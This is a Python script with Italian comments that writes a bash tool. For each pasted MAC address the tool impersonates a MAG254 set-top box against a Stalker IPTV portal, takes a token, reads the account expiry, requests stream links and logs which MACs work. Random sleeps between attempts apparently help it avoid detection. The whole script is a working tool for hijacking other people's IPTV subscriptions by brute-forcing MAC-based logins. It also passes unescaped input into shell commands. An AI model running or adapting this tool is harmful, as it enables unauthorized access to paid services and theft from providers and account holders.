import sys
import os
import stat

#url=input()
#path = (url[url.find("://")+3:url.rfind(":")])
#if "/c/" in url:
#	port = (url[url.rfind(":")+1:url.find("/c/")])
#else:
#	port = (url[url.rfind(":")+1:url.find("/get.php")])

print("Server")
path=input()
print("Port")
port=input()

print(path, port)
if not os.path.exists("/root/stbch/"+path):
	os.makedirs("/root/stbch/"+path)
	print("Cartella "+path+" creata!")
else:
	print(path+" esiste gia")

print("Incolla")
userInput = sys.stdin.readlines()
open("/root/stbch/"+path+"/maclist.txt", "w").close()
with open("/root/stbch/"+path+"/maclist.txt", "w") as fil:
	for a in userInput:
		posix = a.find("00:1")
		if len(a[posix:posix+17])>6:
			print(a[posix:posix+17])
			fil.write(a[posix:posix+17]+"\n")
			testmac=a[posix:posix+17]

fil.close()

with open("/root/stbch/"+path+"/checkmaclive.sh", "w") as script:
	script.write('''while read p; do

SERVER="'''+path+'''"
PORT='''+port+'''
MAC=${p}
RTMP=99
CHANNEL=$1

curl --compressed -s -A 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3' -e "http://${SERVER}:${PORT}/c/" -b "mac=${MAC}; stb_lang=en; timezone=Europe/Paris" -H 'X-User-Agent: Model: MAG254; Link: WiFi' -H "Host: ${SERVER}:${PORT}" -H "Accept-Language: en-US,*" -H "Accept-Charset: UTF-8,*;q=0.8" -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Accept-Encoding: gzip' "http://${SERVER}:${PORT}/portal.php?type=watchdog&action=get_events" > /dev/null

curl --compressed -s -A 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3' -e "http://${SERVER}:${PORT}/c/" -b "mac=${MAC}; stb_lang=en; timezone=Europe/Paris" -H 'X-User-Agent: Model: MAG254; Link: WiFi' -H "Host: ${SERVER}:${PORT}" -H "Accept-Language: en-US,*" -H "Accept-Charset: UTF-8,*;q=0.8" -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Accept-Encoding: gzip' "http://${SERVER}:${PORT}/portal.php?type=vod&action=get_categories" > /dev/null

#Autenticazione
AUTH=$(curl --compressed -s -A 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3' -e "http://${SERVER}:${PORT}/c/" -b "mac=${MAC}; stb_lang=en; timezone=Europe/Paris" -H "Host: ${SERVER}:${PORT}" -H "Accept-Language: en-US,*" -H "Accept-Charset: UTF-8,*;q=0.8" -H 'X-User-Agent: Model: MAG254; Link: WiFi' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Accept-Encoding: gzip' "http://${SERVER}:${PORT}/portal.php?type=stb&action=handshake&token=&JsHttpRequest=1-xml" | jq '.[].token' | tr -d '"')

echo "Bearer: ${AUTH}"

#Info profilo - no necessaria
curl --compressed -s -A 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3' -e "http://${SERVER}:${PORT}/c/" -b "mac=${MAC}; stb_lang=en; timezone=Europe/Paris" -H 'X-User-Agent: Model: MAG254; Link: WiFi' -H 'Cache-Control: no-cache' -H "Host: ${SERVER}:${PORT}" -H "Accept-Language: en-US,*" -H "Accept-Charset: UTF-8,*;q=0.8" -H 'Connection: keep-alive' -H 'Accept-Encoding: gzip' -H "Authorization: Bearer ${AUTH}" "http://${SERVER}:${PORT}/portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml&hd=1&num_banks=2&not_valid_token=0&auth_second_step=0&video_out=hdmi&client_type=STB&metrics={'mac':${MAC},'sn':'','model':'MAG254','type':'stb','uid':''}" > /dev/null


#Scadenza - stampata
echo "Scadenza: "
curl --compressed -s -A 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3' -e "http://${SERVER}:${PORT}/c/" -b "mac=${MAC}; stb_lang=en; timezone=Europe/Paris" -H 'X-User-Agent: Model: MAG254; Link: WiFi' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H "Host: ${SERVER}:${PORT}" -H "Accept-Language: en-US,*" -H "Accept-Charset: UTF-8,*;q=0.8" -H 'Accept-Encoding: gzip' -H "Authorization: Bearer ${AUTH}" "http://${SERVER}:${PORT}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml&mac=${MAC}" | jq '.[].phone' | tr -d '"'

#LINK
LINK=$(curl --compressed -s -A 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3' -e 'http://${SERVER}:${PORT}/c/' -b "mac=${MAC}; stb_lang=en; timezone=Europe/Paris" -H 'X-User-Agent: Model: MAG254; Link: WiFi' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H "Host: ${SERVER}:${PORT}" -H "Accept-Language: en-US,*" -H "Accept-Charset: UTF-8,*;q=0.8" -H 'Accept-Encoding: gzip' -H "Authorization: Bearer ${AUTH}" "http://${SERVER}:${PORT}/portal.php?type=itv&action=create_link&cmd=ffmpeg http://localhost/ch/${CHANNEL}_" | jq -r '.[].cmd' | tr -d '"' | cut -c8-)
echo $LINK

#ffmpeg -re -i "${LINK}" -vcodec copy -acodec aac -b:a 192k -ac 2 -ar 44100 -af "aresample=async=1:min_hard_comp=0.100000:first_pts=0" -bufsize 2000k -f flv "rtmp://10.8.0.1/bucketcrm${RTMP}"

CODE=$(curl --compressed -s -o /dev/null -A 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3' -e "http://${SERVER}:${PORT}/c/" -b "mac=${MAC}; stb_lang=en; timezone=Europe/Paris" -H 'X-User-Agent: Model: MAG254; Link: WiFi' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H "Accept-Language: en-US,*" -H "Accept-Charset: UTF-8,*;q=0.8" -H 'Accept-Encoding: gzip' -H "Authorization: Bearer ${AUTH}" "${LINK}" -w "%{http_code}")
#
#TOREST=$(pgrep ffmpeg -a | grep "bucketcrm${RTMP} -codec copy -hls_flags delete_segments" | cut -c1-5)
#TORESTAUDIO=$(pgrep ffmpeg -a | grep "bucketcrm${RTMP} -vn -acodec copy -hls_flags delete_segments" | cut -c1-5)
#echo $TOREST
#echo $TORESTAUDIO
#kill $TOREST
#kill $TORESTAUDIO
#
date +"%T"
if [ $CODE = "302" ]; then
    echo ${p} >> /root/stbch/'''+path+'''/$CHANNEL
    echo -e "\e[32m"
fi
echo -e "CODE: ${CODE}\e[0m"
echo "MAC: ${p}"
echo "  #############  "
sleep $(shuf -i5-15 -n1)
#sleep 2
done </root/stbch/'''+path+'''/maclist.txt''')

os.chmod("/root/stbch/"+path+"/checkmaclive.sh",stat.S_IXUSR)

os.system("bash /root/listmacchannels.sh "+path+" "+port+" "+testmac)
os.system("bash /root/listmacchannels.sh "+path+" "+port+" "+testmac+" *")
